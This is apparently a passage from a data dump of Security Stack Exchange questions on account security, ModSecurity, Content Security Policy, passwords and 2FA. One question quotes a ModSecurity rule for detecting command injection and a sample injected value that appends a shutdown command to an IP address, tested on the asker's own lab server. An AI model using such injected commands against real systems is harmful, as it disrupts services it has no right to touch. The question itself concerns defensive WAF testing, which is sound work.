is my scheme is less secure than the 99% of websites exposed to theses attacks and if the answer is yes, please tell me how you could attack my scheme ?</p>

<p>My scheme idea: <a href=""https://medium.com/@lakano/an-idea-to-have-a-user-friendly-safe-authentification-3766af611560"" rel=""nofollow noreferrer"">https://medium.com/@lakano/an-idea-to-have-a-user-friendly-safe-authentification-3766af611560</a></p>
","159165","","159165","","2017-09-21 10:20:00","2017-09-21 16:59:58","is my scheme is less secure than the 99% of websites exposed to theses attacks?","<authentication><password-management><audit><account-security><password-reset>","5","1","","2017-09-20 20:18:39","","CC BY-SA 3.0"
"30217","1","","","2013-02-04 05:35:21","","0","456","<p>I run an Apache webserver with lots of PHP-sites of several customers.</p>

<p>I tried install apache-mod_security2 after this <a href=""http://powie.de/howto/apache-mod_security2-auf-debian-lenny-installieren/"" rel=""nofollow"">(german) tutorial</a>
that is using these rulesets: <a href=""http://www.modsecurity.org/download/modsecurity-core-rules_2.5-1.6.1.tar.gz"" rel=""nofollow"">http://www.modsecurity.org/download/modsecurity-core-rules_2.5-1.6.1.tar.gz</a></p>

<p>but if I enable that, nearly all pages have lots of warnings.</p>

<p>I know, it would be best, to adapt all sites, so no warnings are thrown anymore, but that is just too much work for one admin, so I would like to pull those rules down to only the obvious critical Attacks.</p>
","13212","","11801","","2013-02-05 15:52:23","2013-02-05 15:52:23","Is there an easy way to secure Apache on debian?","<linux><webserver><apache><mod-security>","2","0","","","","CC BY-SA 3.0"
"30230","1","","","2013-02-04 11:37:26","","1","1809","<p>I only found this: 
<a href=""http://sourceforge.net/projects/mod-spamhaus/files/?source=navbar"" rel=""nofollow"">http://sourceforge.net/projects/mod-spamhaus/files/?source=navbar</a>
and that is from 2008</p>

<p>Is there any newer apache mod that is up-to-date?</p>

<p>Someone has experience with it? Maybe <a href=""http://www.howtoforge.com/block-spammers-hackers-with-mod_defensible-on-apache2-debian-etch"" rel=""nofollow"">mod_defensible</a>?  </p>
","13212","","485","","2013-02-04 12:11:29","2017-10-27 18:02:29","Is apache mod_spamhaus still being maintained?","<apache><mod-security>","3","0","","","","CC BY-SA 3.0"
"238748","1","","","2020-09-24 13:33:23","","0","150","<p>I recently made a new Facebook account from my android phone [ver. 6.0.1] and when I checked active sessions, instead of my android device a, Linux desktop was displayed.</p>
<p>Then I checked my Gmail and I found that an unknown Linux device logged in about a week ago in two of my Gmail and then I changed all of my passwords and activated 2-step authentication.</p>
<p>But today when I checked my new Facebook account, it was disabled by Facebook due to breaking their rules. I then checked my old Facebook account and found that the Linux device was also logged in and when I checked active sessions, first it said I am on an android device then as I checked it again, it showed my device is a Linux Desktop and then as I refreshed it again, it switched back to android.</p>
<p>After that I checked my login history on other sites and some of them were showing Linux device instead of android.</p>
<p>What should I do now to secure my accounts and data now?</p>
","243189","","6253","","2020-09-24 14:23:25","2020-09-24 14:23:25","Accounts hacked. Eventually showing a different device","<account-security>","0","10","","","","CC BY-SA 4.0"
"169964","1","169999","","2017-09-22 07:30:54","","-5","190","<p>On the dark net we can buy database leaks with nicknames, emails addresses, passwords, questions/answers to prove identity, and other fields. Sometimes the passwords/answers are in clear, sometimes only hashed without unique salt, and we could use rainbow tables to found the password and/or answers.</p>

<p>Most users on the Internet use the same password and answers on many websites. This means if an attacker could obtain an email/password with a db leak, he could connect easily to the user account on multiple websites.</p>

<p>Experts suggest to use 2FA, for example the user can install Google Authenticator on his mobile device, then when the user/attacker try to login from a desktop browser, a confirmation is required on the mobile.</p>

<p>Great, but the problem of this method is the user needs to save somewhere his backup codes on the Internet (if his house burns), and they need to easily access these files without his mobile Google Auth app in case if he lost their phone. </p>

<p>We could imagine that most of users will save their backup codes on a cloud storage or maybe send them to yourself per email. The problem is here, because the attacker can have access to the user services not protected by 2FA. This mean the attacker could check on each cloud storage services with the email/password of the user, and just make a search to find each file that matches ""Backup-codes-*.txt""</p>

<p>This is a possible vector of attack. There is a solution to prevent this attack please?</p>
","159165","","","user84120","2017-09-22 14:56:45","2017-09-22 19:05:08","How to prevent the usage of databases leaks to connect on other websites that use the same email/password?","<passwords><password-management><account-security>","1","18","","2017-09-24 14:20:42","","CC BY-SA 3.0"
"169975","1","169976","","2017-09-22 10:24:24","","0","281","<p>I'm currently investigating a situation where apparently emails I have sent from my gmail account have been also forwarded to another gmail account, without my being aware of it.</p>

<p>Is this plausible or feasible - that an email can be auto-forwarded, but not appear in ""Sent Mail"" and for the auto-forward rule to be hidden somehow?</p>

<p>What measures could I take to:</p>

<ul>
<li>Establish whether this may have occurred?</li>
<li>Prevent it from re-occurring?</li>
</ul>
","159619","","","","","2017-09-22 10:31:29","Is hidden gmail forwarding plausible?","<account-security><gmail>","1","0","","","","CC BY-SA 3.0"
"238977","1","238997","","2020-09-29 21:33:18","","0","132","<p>Is <a href=""https://div.show/options"" rel=""nofollow noreferrer"">https://div.show/options</a> fraud/malware? I saw via <a href=""https://app.uriports.com"" rel=""nofollow noreferrer"">https://app.uriports.com</a> that a customer tried to load the page mentioned before and it was blocked thanks to CSP.</p>
","150323","","","","","2020-09-30 07:55:35","Is https://div.show/options fraud/malware?","<malware><content-security-policy><fraud>","1","0","","2020-09-30 08:07:39","","CC BY-SA 4.0"
"170031","1","","","2017-09-23 05:39:30","","1","94","<p>Iam not sure if this is the right place to ask this question. I would like to know what security features an electronic store should have besides the general alarm system monitored by a security company?</p>

<p>Its not a big electronic store but not small, should i consider things like a storeroom, safe or vault, although i do think a vault is too much for a the store. Would the safety room (vault,safe or store room) be protected by separate alarm and if so what would it be like, a gsm based unit? Note the safety room is for the electronics not on display.</p>

<p>Should i consider tracking devices and if so how would the work with the electronics such as cameras,laptops and cellphones etc.</p>

<p>Thanks guys </p>
","159681","","","","","2017-09-23 05:39:30","Electronic store security","<physical><user-tracking><security-theater><tracking><business-logic-attack>","0","1","","2017-09-23 11:22:31","","CC BY-SA 3.0"
"170069","1","","","2017-09-24 07:20:23","","1","1903","<p><a href=""https://www.owasp.org/index.php/OWASP_Secure_Headers_Project"" rel=""nofollow noreferrer"">OWASP Security Headers Project</a> recommends the following security headers for web applications. Out of the following which headers are relevant to mobile applications?</p>

<pre><code>HTTP Strict Transport Security (HSTS)
Public Key Pinning Extension for HTTP (HPKP)
X-Frame-Options
X-XSS-Protection
X-Content-Type-Options
Content-Security-Policy
X-Permitted-Cross-Domain-Policies
Referrer-Policy
</code></pre>

<p>I know usage of X-Frame-Options, HTTP Strict Transport Security (HSTS) etc. is irrelevant for native and webview based mobile applications.  </p>
","159736","","98538","","2017-09-24 11:51:11","2017-09-24 11:51:11","HTTP security headers for native and webview based mobile applications","<web-application><http><mobile><content-security-policy><webview>","0","4","","","","CC BY-SA 3.0"
"239029","1","239069","","2020-09-30 16:05:47","","0","182","<p>I run a website that allows people to create accounts with an email address address and a password.  Over the last month, I have had about 100 accounts created with email addresses that look like this:</p>
<pre><code>pa.rk.i.n.g.x.pe.rtdon.ma.na.h.a.n.@gmail.com (always with lots of dots)
</code></pre>
<p>and the provided name is one of</p>
<pre><code>Robertskala
Jeanniebiz
JamesClurn
</code></pre>
<p>Usually, the emails bounce and the accounts get deactivated, but sometimes they don't.</p>
<p>Is my website being used for some kind of scam?  I don't see any benefit they can get from having an account on my website even if it isn't their email address.</p>
<p>Wondering if I should add a captcha for account creation to prevent some kind of scam or fraud.</p>
<p>UPDATE:</p>
<p>It is so easy to create throw away email accounts and people can already do this to create an account on my website.  I don't want to go into the details of my website, but there is no benefit to be gained with a throwaway account there.</p>
<p>Is there a security risk that is related to these long email addresses with lots of dots?  I'm wondering if I should reject emails with more than 3 dots.</p>
<p>I googled the email address and there is a Don Monahan who owns a website called parking-xpert.  I wonder if a scammy SEO provider is trying to get backlinks for a client through my website?</p>
","64398","","64398","","2020-09-30 17:29:08","2021-06-03 12:37:02","Security risk for allowing accounts without captcha","<email><account-security><fraud><scam>","1","4","","","","CC BY-SA 4.0"
"30513","1","","","2013-02-08 06:43:06","","3","2179","<p>I'm developing a WAF with good GUI and better log. And my base firewall is mod-security. It works well for http but I also want to work my WAF with https. Any suggestions?</p>
","20547","","","","","2013-02-08 07:27:21","How to filter https traffic in mod-security WAF?","<tls><mod-security><waf>","1","7","","","","CC BY-SA 3.0"
"239182","1","","","2020-10-05 07:52:00","","1","190","<p>I am testing web application firewall and I have installed ModSecurity 2.9  runs Core ModSecurity Rule Set ver.2.2.9   and to test on Web application I also install DVWA  Platform: Windows
and trying to do Command Inject and it allows even if  I included rules for command inject
modsecurity_crs_40_generic_attacks.conf
all other rules for SQLinject,XSS etc  works fine .
<a href=""https://i.stack.imgur.com/KvYzM.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/KvYzM.png"" alt=""Command Injection in windows "" /></a></p>
<p>the Rule for Command Inject is as follows</p>
   <code>
<pre><code> SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* &quot;@rx (?i)(?:;|\{|\||\|\||&amp;|&amp;&amp;|\n|\r|`)\s*[\(,@\'\&quot;\s]*(?:[\w'\&quot;\./]+/|[\\\\'\&quot;\^]*\w[\\\\'\&quot;\^]*:.*\\\\|[\^\.\w '\&quot;/\\\\]*\\\\)?[\&quot;\^]*(?:\.[\&quot;\^]*\w+)?\b&quot; \
        &quot;phase:2,rev:'2',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'8',capture,t:none,t:normalisePath,ctl:auditLogParts=+E,block,msg:'System Command Injection',id:'950907',tag:'OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION',tag:'WASCTC/WASC-31',tag:'OWASP_TOP_10/A1',tag:'PCI/6.5.2',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',severity:'2',setvar:'tx.msg=%{rule.msg}',setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION-%{matched_var_name}=%{tx.0},skipAfter:END_COMMAND_INJECTION1&quot;

SecMarker END_COMMAND_INJECTION1
</code></pre>
</code>
I want to know what can be done so that if I inject a command  127.0.0.1 & shutdown /l or anything after ""&"" in textbox  the ModSecurity must redirect to 403 error page . 
I have read similar post and solutions if I try my apache server will crash .
","243697","","","","","2023-07-01 00:04:55","ModSecurity Command Injection not working","<windows><injection><mod-security>","2","0","","","","CC BY-SA 4.0"
"239199","1","","","2020-10-05 23:42:35","","1","582","<p>I have found multiple sources telling me otherwise, but most are outdated by a year or two. If I am logged into my G-suite managed account on google, and search something up on a home network and personal device, can my school still see my browsing history? If it makes a difference, in Web and App Activity the option for recording history is off for the account and is disabled by my G-suite organization.</p>
<p>From what I have read, the only way for a G-suite administrator can view your browsing history is if your Web Activity option is enabled and they reset your password to log into your account and view it there, but not any other way (especially not without you noticing). Does this still hold true? Or have things changed recently with the new normal of online learning. If any G-Suite administrators could shed some insight it would be extremely helpful, thanks!</p>
","243737","","","","","2020-10-05 23:42:35","My college manages my Google account, can they view my browsing history if I use a personal device on a home network while logged in?","<network><privacy><web-browser><appsec><account-security>","0","2","","","","CC BY-SA 4.0"
"30583","1","30586","","2013-02-09 11:24:51","","2","1543","<p>I want to know more about the <strong>fight-back security mechanism in OSPF</strong> routing protocol.</p>

<p>When is the mechanism activated and how does it work?</p>

<p>I found the source description of OSPF fight-back, but the description is vague.</p>
","20333","","18192","","2013-02-09 11:42:35","2013-02-09 13:26:15","What is the fight-back mechanism in OSPF?","<protocols><routing><security-theater>","1","0","","","","CC BY-SA 3.0"
"239253","1","","","2020-10-07 02:55:54","","-1","194","<p>I once heard that the author of the early NES emulator &quot;Nesticle&quot;, clearly a very intelligent person, baffingly used some kind of exploitable &quot;Samba&quot; or &quot;SMB&quot; server running in his home with its source code (and probably other private files/data) on it.</p>
<p>The result was that somebody, somehow, managed to break into it and steal the source code. This made him not want to work on the project anymore, understandably if you understand us folks who don't do &quot;open source&quot; development. (Even if we give away the resulting program for free.)</p>
<p>An old friend of mine mentioned that he would be storing some embarrassing videos and audio recordings we made as kids, on his home &quot;NAS&quot;. I shuddered at the thought and asked him to please not do that, since it's not secure. (My own copies were on encrypted disks, without any cables going into them, in a fireproof safe.)</p>
<p>I've heard numerous people talk about their &quot;home networks&quot; and how they make all their files available to &quot;all their computers at home&quot; (what kind of insane office/enterprise setups do they have at home?!), because... they must be... available... at all times? It's unthinkable to simply use an USB stick to put the relevant file(s) on the few times you need them and physically move them to the machine in question?</p>
<p>In numerous other situations, I've noticed that people who aren't idiots in general behave extremely strangely about data security. Even when it's themselves that would get affected by a hack/compromise.</p>
<p>And it happens over and over again. Even if you constantly keep all the software updated, which is extremely rare (most people seem to not have any idea that things <em>ever</em> have to be updated/patched/maintained in any way), there's just so many mistakes and arrogant assumptions made by developers. A popular database software exposed all my databases to the world without even requiring a password, even though I had set one, with my only finding out about this much later. I can only hope that nobody even bothered to try breaking into it, but it was like a cold shower when I realized that this was the case. And it was far from the only such instance.</p>
<p>At this point, I have zero trust left in people and developers of software/hardware. Yet people who seem to be far smarter than I still seem so incredibly casual and careless about even their most private data that I'm left wondering what I'm missing.</p>
<p>Why is it so crucially important to a lot of people to have &quot;occasional convenience&quot; over the ability to sleep at night without thinking about some blackmailer across the world fetching your private photos and personal writings from your always-on file server?</p>
<p>Are they just incredibly naive, in spite of having big houses with tons of computers and even (in many cases) programming/computer skills far surpassing my own? I don't understand it.</p>
","243793","","","","","2020-10-07 04:37:50","Why do people, even programmers and geeks, seem to almost feel the urge to ""give hackers a fair chance"" at stealing their data?","<network><privacy><server><physical><security-theater>","1","2","","2020-10-07 06:37:19","","CC BY-SA 4.0"
"239317","1","239323","","2020-10-08 16:42:19","","0","236","<p>I know someone can break open the case, but what about opening it without leaving evidence?</p>
<p>Are there any seals available for securing your laptop from unauthorized access?</p>
<p>And sealing the sides of the laptop with superglue</p>
","209619","","6253","","2020-10-08 17:09:41","2020-10-08 18:01:15","Will using super-glue on the screws of my laptop prevent it from being opened unnoticed?","<physical-access><security-seal>","1","4","","","","CC BY-SA 4.0"
"30701","1","30712","","2013-02-11 13:40:36","","-1","403","<p><strong>Code:</strong></p>

<pre><code>$result = ""Hello World"";
$jsonEncodeValue = $result;
echo $jsonEncodedValue;
</code></pre>

<p><strong>Assumed Output:</strong></p>

<pre><code>""Hello World""
</code></pre>

<p><strong>Real Output:</strong></p>

<pre><code>\n""Hello World""
</code></pre>

<p>This <strong>\n</strong> Line Feed added automatically. </p>

<p>For this extra Line Feed my result breaks down while parsing through JSON parser.
I am trying several hours to solve the issues. </p>

<p>I have checked at </p>

<ul>
<li>.htaccess is there any auto_prepend file exists which adds extra Line Feed, but not. I didn't get anything.</li>
<li>Cgi-bin file is there any malicious code exists that adds extra Line Feed, but not. Didn't get anything.</li>
</ul>

<p><strong>My Question:</strong> </p>

<ul>
<li>Is someone injecting HTML or PHP code?</li>
<li>If then, how to detect from where code injection is running (is there any way to find out from which file code injection is running) and how to prevent?</li>
</ul>
","12757","","","","","2013-02-11 15:13:35","How to prevent code injection like automatically adding extra character?","<sql-injection><source-code><security-theater>","1","2","","2013-02-11 15:46:02","","CC BY-SA 3.0"
"239478","1","239480","","2020-10-13 06:45:14","","0","119","<p>Hello i am developing an app that collects some private data from my clients. My clients wont like it if i am able to read the data. So the data is encrypted in cleint side with a key say &quot;xyz&quot;,which is auto generated when client install the app/make a account and only with this key can someone read this data.
Now when the client login from a new device i want the client to generate the key, and use it to retrieve the data . How do i do that?
I cant save xyz in server since then i will have both key and encrypted data, I cant generate xyz with password or User details since i will have them and i knows how to create the key from that data</p>
<p>Is there a way to achieve this without saying to client Trust me am truest worthy. Or make your own key!?</p>
","244085","","","","","2020-10-15 07:30:44","Save encrypted data in server . With no way for server to read actual data","<encryption><privacy><rsa><content-security-policy>","1","2","","","","CC BY-SA 4.0"
"239639","1","239677","","2020-10-16 11:46:29","","1","1307","<p>I'm wondering if I'm risking anything if I use</p>
<pre><code>style-src-attr 'unsafe-hashes' &lt;hash&gt;
</code></pre>
<p>in my CSP header.</p>
<p>I need to allow an external script to run, and it uses the style attribute on some elements.</p>
<p>I have no control over the external script, and if there is a malicious person behind it, what might an attack vector be? (considering unsafe-inline has not been added)</p>
<p>How can a style attribute execute scripts or access my DOM or otherwise cause anything harmful to happen?</p>
","177482","","","","","2020-11-12 11:55:43","What do I risk if I use CSP header style-src-attr 'unsafe-hashes' <hash>","<content-security-policy>","2","0","","","","CC BY-SA 4.0"
"239645","1","","","2020-10-16 18:16:13","","9","559","<p>I get that what comprises a good password is a bit of a moving target and not everyone agrees - just run a password through a number of checkers to see how it is rated differently depending on the criteria.</p>
<p>But a couple of things seem like safe bets and are widely acknowledged - length (as a method of achieving entropy, famously covered here: <a href=""https://xkcd.com/936/"" rel=""noreferrer"">https://xkcd.com/936/</a>), and size of character set, which doubles the number of possible combinations with each additional character.</p>
<p>So WHY DEAR GOD do some sites insist on limiting passwords to 8-16 characters, and/or disallow special characters? One example is WA state's GoodToGo toll road website, which does both.</p>
<p>This feels like it's one of three things, two of which are bad:</p>
<ol>
<li><p>Developers using antiquated frameworks that impose this last-millenium restriction;</p>
</li>
<li><p>Developers still subscribing to the theory that long passwords are bad because they are hard to remember;</p>
</li>
<li><p>Some cutting-edge understanding of password security that makes this an actual best practice that I have just never heard of and can't comprehend.</p>
</li>
</ol>
<p>I'm hoping that this is just fading away, but I keep running into it. We need a public shaming site that lists sites that do this, to force them into adapting reasonable password form practices.</p>
","244276","","","","","2020-10-16 18:45:26","Why do some sites enforce low-security passwords?","<passwords><account-security>","1","2","","2020-10-17 10:31:40","","CC BY-SA 4.0"
"170866","1","170867","","2017-10-08 05:45:42","","0","1877","<p>I'm trying to understand why certain CSPs block inline javascript. Is the concern that a user will be able to insert javascript that will then be served to other users? If so, isn't this an issue with the fact that a user somehow has the ability to serve whatever they want to users from your site? How is this a CSP problem?</p>
","156193","","","","","2017-10-08 06:05:32","What vulnerability do inline javascript and event handlers expose?","<javascript><content-security-policy>","2","0","","2017-10-11 15:51:09","","CC BY-SA 3.0"
"239864","1","","","2020-10-21 17:06:25","","2","190","<p>I am performing a security assessment on a web application and I found it doesn't have the Content-Security-Policy, but instead it has Content-Secure-Policy. It is literally the first time I'm seeing such a case and I would like to know:
Are these two headers equivalent?</p>
<p>Will browsers be able to recognize this Content-Secure-Policy?</p>
","244523","","6253","","2020-10-21 19:00:33","2022-11-19 21:01:20","Content-Secure-Policy headers","<web-application><web><content-security-policy><header>","1","3","","","","CC BY-SA 4.0"
"239914","1","","","2020-10-22 16:02:18","","1","100","<p>We have DBAs who want to access SQL DBs over DirectAccess (DA). The ask is to open port TCP 1530 over DA. At the moment, we have 6,000 people using DA, we can't filter on a specific group of DBAs. Effectively if we open the DA rules to all clients, that's 6000 individuals with access to the DBs (TCP 1530).</p>
<p>What's the best practice approach? Preferentially backed with official vendor/body preferences.</p>
","162004","","6253","","2020-10-23 07:10:23","2020-10-23 07:13:16","Direct VPN access to DBs - government guidelines (DBAs at home COVID)","<vpn><account-security><sql-server>","1","1","","","","CC BY-SA 4.0"
"240115","1","240132","","2020-10-28 06:57:20","","0","437","<p>DOM XSS and client prototype pollution-based XSS have one thing in common, we are modifying the pre-existing JavaScript code to popup an <code>alert(1)</code>. Will CSP mitigate XSS in this case? Theoretically, JavaScript is already there and we aren't inserting new JavaScript, just modifying the existing code, so it makes sense that CSP won't have an effect, or are browser smart enough to prevent those variants of XSS?</p>
<p>External Links:  <a href=""https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/recaptcha.md"" rel=""nofollow noreferrer"">An example of client-side prototype pollution based xss</a></p>
","259796","","71850","","2020-10-28 07:47:20","2021-04-11 23:06:15","Does CSP mitigate against client prototype pollution XSS and DOM XSS?","<xss><javascript><content-security-policy><dom><prototype-pollution>","2","0","","","","CC BY-SA 4.0"
"103700","1","177500","","2015-10-26 09:55:30","","16","437","<p>An online company from which I regularly buy goods apparently recently upgraded their security policy.</p>

<p>Let's say I bought something for 73,31€. As usual this company uses 3D-Secure for the checkout process and will actually process the payment only upon shipment a few days later.</p>

<p>The shipment confirmation email contained a strange notice I could translate as follow:</p>

<blockquote>
  <ul>
  <li>Amount ordered: 73,31 €</li>
  </ul>
  
  <p>Within the framework of the reassurance of the online payments we
  proceeded to the following operations:</p>
  
  <ul>
  <li>Amount charged on your credit-card: 73,41 €</li>
  <li>Amount credited on your credit-card: 0,10 €</li>
  </ul>
</blockquote>

<p>The amount additionally charged appears to be random and varies from a few cents to a few euros.</p>

<p>I'm wondering <strong>what threat are they protecting against?</strong></p>

<ul>
<li>They received the payment, so they got the money.</li>
<li>They used 3D-Secure for a relatively low amount, so the transaction is largely covered by the bank in case of fraud.</li>
<li>It seems they are checking that the card used for the payment can also process credit, maybe a way to detect prepaid or onetime payment cards, but again: what's the point since they got the money? By the way they also had to create a new page for the users of such cards a few weeks after deploying this system, <em>""Due to technical restrictions""</em> as they stated it.</li>
</ul>

<p>I just do not understand the threat they are trying to avoid, or maybe is it just some security theater made to impress customers with some crappy but unique security measure?</p>
","32746","","36538","","2018-01-17 15:14:42","2018-01-17 15:14:42","Is adding a supplementary credit transaction something that could improve online payment security?","<credit-card><security-theater><fraud><e-commerce>","2","15","0","","","CC BY-SA 3.0"
"171230","1","","","2017-10-13 16:24:27","","5","21273","<p>LastPass is good for storing and using username-password pairs for websites.</p>

<p>Some websites (such as for banks) have more complicated login procedures which don't fit the standard LastPass system.</p>

<p>For these websites, more information must be stored, such as security questions, multiple passwords and grids of characters.</p>

<p>LastPass has a Secure Notes feature, which allows such data to be stored.</p>

<p>Google Keep also allows such data to be stored. I find Google Keep quicker and easier to use and would prefer to use it if there was no security disadvantage.</p>

<ul>
<li><p>I stay logged in to LastPass all the time in Chrome, as I do to my
Google account.</p></li>
<li><p>I have 2FA enabled on both my LastPass and Google accounts and have a strong password for both.</p></li>
<li><p>I have an Android phone which requires fingerprint or pattern login. Once logged in, Keep can be opened without further authentication while LastPass requires further fingerprint or password login. This is the only advantage I can see that LastPass has - Keep can be accessed with just the pattern whereas LastPass requires my finger or its password.</p></li>
</ul>

<p><strong>Is there a security reason to use LastPass Secure Notes rather than Google Keep?</strong></p>

<p>P.S. I think that a pattern login is less secure than a password login. Please give me reasons other than this.</p>
","27326","","27326","","2017-10-13 18:27:00","2017-10-13 21:00:39","Is Google Keep more secure than LastPass Secure Notes?","<authentication><password-management><account-security><lastpass>","1","5","","","","CC BY-SA 3.0"
"240142","1","","","2020-10-28 15:24:15","","0","612","<p>I was on my normal gmail account that I always use, then this website opened my google docs app which was signed into my school account and it put some weird stuff on there like “i’m the hottest girl in school” weird messages.</p>
<p>Can the school see that that document got put on there although it was not my school laptop or their wifi it was just my gmail that opened the doc?</p>
","244869","","6253","","2020-10-28 15:29:57","2021-12-30 22:56:22","Can the school see what you do on the school's Google account even on your own device and at home?","<account-security><google>","1","0","","","","CC BY-SA 4.0"
"171375","1","","","2017-10-16 13:01:05","","0","354","<p>You will often get contact numbers for banks online or through other people, even on the back of your cards. How can one verify whether a number is genuine? </p>

<p>For it seems to me that it should be easy to send specific emails/voice messages saying call back on this number, but once you are on the call, there is really no verification of the dialed number, only the person calling. </p>

<p>What system could be devised to verify the receiving party is genuine as well, as they can easily fake a verification system for your responses, and testing them by telling incorrect information seems like shooting yourself in the foot, as it might get you locked out of your own account? </p>

<p>I know the current method of ensuring correct numbers is dialing the number at the back of your card, or from your statement, or from bank's website, but I am sure all that information can be modified in some way or other.</p>

<p>To add a bit to the discussion - </p>

<ul>
<li><p>Over the phone, all you hear is a person talking, and they can be persuasive, regardless of if they are genuine or not, that's why most scams work on the telephone, as there no other indicators of authenticity.  </p></li>
<li><p>Whereas online, you can see the SSL symbol, verify the domain name, and see their branding ...etc (admittedly this all can be duplicated as well, but is not at the same level of ease as duplicating a call script and a person).</p></li>
<li><p>At a branch - again you have the branding, and public visibility, professional staff (more than one, in a decent branch). These are legally protected as well from duplication. </p></li>
</ul>

<p>Sophisticated phishing attacks have successfully used a combination of these to trick end-users. Usually <a href=""http://www.marketwatch.com/story/why-you-shouldnt-answer-the-phone-when-your-bank-calls-2017-03-30"" rel=""nofollow noreferrer"">incoming calls</a> are the chief suspect, but outbound calls could also be tricked is my guess. The reason i posted this question, was I got a similar incoming call from the fraud department and asked to verify with PIN, and I wasn't sure even after calling the legitimate number.</p>
","21676","","21676","","2017-10-19 06:38:41","2017-10-19 06:38:41","How do i verify a banks contact number is correct?","<account-security>","1","7","","","","CC BY-SA 3.0"
"240298","1","240305","","2020-10-31 15:30:28","","1","401","<p>I found a website that has a very strict but malformed Content Security Policy of the form:</p>
<pre><code>Content-Security-Policy: script-src none
</code></pre>
<p>which should actually be</p>
<pre><code>Content-Security-Policy: script-src 'none'
</code></pre>
<p>Firefox shows warnings</p>
<blockquote>
<p>Content Security Policy: Interpreting http://none as a hostname, not a keyword. If you intended this to be a keyword, use ‘none’ (wrapped in single quotes).</p>
</blockquote>
<blockquote>
<p>Content Security Policy: Interpreting none as a hostname, not a keyword. If you intended this to be a keyword, use ‘none’ (wrapped in single quotes).</p>
</blockquote>
<p>Can this be exploited by generating a server that would satisfy the hostname requirement?
How would a hostname address like this look like?</p>
","222800","","","","","2020-10-31 17:14:34","Is it possible to bypass malformed Content Security Policy missing quotes?","<web-application><xss><content-security-policy>","1","1","","","","CC BY-SA 4.0"
"31556","1","","","2013-02-26 15:08:10","","4","2773","<p>I want to provide basic defense against brute-force attacks against a simple HTTPS web service. The web service provides a <code>login</code> method (let's say at <a href=""http://example.org/login"" rel=""nofollow"">http://example.org/login</a>) which gets passed a username and password as HTTP GET parameters or as fields of a JSON object given by HTTP POST. The service returns HTTP status code 403 on failed login attempts. I can think of two kinds of attacks to secure against:</p>

<ul>
<li>Too many failed login attempts from the same IP in a given span of time</li>
<li>Too many failed login attempts for the same username in a given span of time</li>
</ul>

<p>As far as I understand, <code>mod-security</code> is suitable to detect these attacks an block requests, but the tutorials I found are far to complex and the syntax <code>mod-security</code> puzzles me. Could you provide a sample set of rules to secure against the attacks specified above? In pseudo code I'd say something like the following, with appropriate numbers of <code>n</code>, <code>m</code>, and <code>x</code>:</p>

<pre><code>&lt;LocationMatch /login&gt;
  IF response_status == 403 THEN
    user = fetch_user_from_request
    IF  ++fail_count_per_IP[IP] &gt; n  
    OR  ++fail_count_per_USER[USER] &gt; m THEN
       block IP FOR x minutes
&lt;/LocationMatch&gt;
</code></pre>
","21251","","11801","","2013-02-26 17:27:13","2013-02-26 17:27:13","Securing a simple webservice against brute-force with mod-security","<brute-force><mod-security><waf>","1","0","","","","CC BY-SA 3.0"
"240445","1","240482","","2020-11-05 04:15:56","","5","2629","<p>Basically all in the title.</p>
<p>Imagine a simple CSP like</p>
<pre><code>Content-Security-Policy: script-src 'self'
</code></pre>
<p>What is the behaviour of directives that would normally fall back to <code>default-src</code> which are not specified such as <code>img-src</code> or <code>frame-src</code>? Will they default to open (allow everything) or default to closed (allow nothing)?</p>
<p>Unless I'm missing it, neither</p>
<ul>
<li><a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src"" rel=""noreferrer"">the Mozilla CSP docs</a>, and</li>
<li><a href=""https://content-security-policy.com/default-src/"" rel=""noreferrer"">content-security-policy.com</a></li>
</ul>
<p>specify the behaviour if directives are missing.</p>
","61443","","","","","2020-11-12 07:07:32","What is the behaviour of CSP if default-src not specified?","<content-security-policy>","2","1","","","","CC BY-SA 4.0"
"31688","1","","","2013-02-28 10:13:07","","0","2226","<blockquote>
  <p>I want to use Mod Security as transparent mode. Mod security WAF should be between server and client and client provided with only server's ip address to access the site. The client should not aware about the presence of Mod security since it provided server's ip address unlike in reverse proxy mode.
  Is it possible to use mod security as mentioned above.?</p>
</blockquote>

<p>I want to deploy mod security as transparent proxy (layer 7). As imperva has deployed WAF. See Deployment Modes in specification Tab <a href=""http://www.imperva.com/products/wsc_web-application-firewall.html"" rel=""nofollow""> Link </a>.</p>
","20547","","20547","","2013-02-28 11:25:52","2013-02-28 16:11:22","Using ModSecurity as transparent mode","<mod-security><waf>","1","1","","","","CC BY-SA 3.0"
"171680","1","","","2017-10-19 09:55:59","","-3","168","<h3>My first question:</h3>

<p>Our new app will work with files that contains sensitive data (e.g. finances). These files will be stored on the client first than synchronized to our server. <br><b>I need a method for ...</b></p>

<ul>
<li>prevent phishing malwares may be exist on client PC to gather these infos</li>
<li>making user data untraceable - preventing anybody to know what data belong to what person.</li>
</ul>

<blockquote>
  <p><strong>So, what are the well-established methods to do this?</strong></p>
</blockquote>

<h3>My second question:</h3>

<p>I heard about some <em>crypto algorithms</em> like AES but I don't know if it's enough to use this (I mean AES256 at least).</p>

<blockquote>
  <p><strong>Is AES good for encrypting files or could you suggest me better?</strong></p>
</blockquote>
","161286","","161286","","2017-10-19 10:12:25","2017-10-19 10:22:46","Strong file encryption for sensitive data","<encryption><cryptography><account-security>","3","2","","2017-10-19 15:40:20","","CC BY-SA 3.0"
"171699","1","","","2017-10-19 12:55:07","","4","222","<p>I had some interesting situation: My Amazon account has 2FA enabled where my smartphone with google authenticator is my second factor.</p>

<p>Due to issues with this phone my second factor basically broke (no longer produced reliable pins).
Since I was on a machine which was marked as trusted I could shop etc just with my email+password on this machine.</p>

<p>When I however tried to add a new smartphone as a replacement factor even on my trusted device I was prompted to enter the second factor, which I couldn't. I then had to resort to entering a phone number in the support area and a representative called me back.</p>

